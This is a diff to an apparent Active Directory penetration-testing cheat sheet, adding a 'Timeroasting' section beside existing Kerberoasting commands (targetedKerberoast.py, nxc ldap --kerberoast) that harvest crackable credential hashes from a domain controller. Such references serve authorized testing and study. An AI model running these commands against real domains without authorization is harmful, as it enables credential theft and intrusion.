@@ -152,6 +152,12 @@ targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'
 nxc ldap $DC_IP -u 'username' -p 'password --kerberoast - -k
 ```
 
+## 3.6 Timeroasting 
+
+```bash
+nxc smb $DC_IP -M timeroast 
+```
+
 ---
 
 [← Prev: 02 — Enumeration](02-enumeration.md) | [Next: 04 — Password Attacks & Credential Abuse →](04-password-attacks-and-credential-abuse.md)
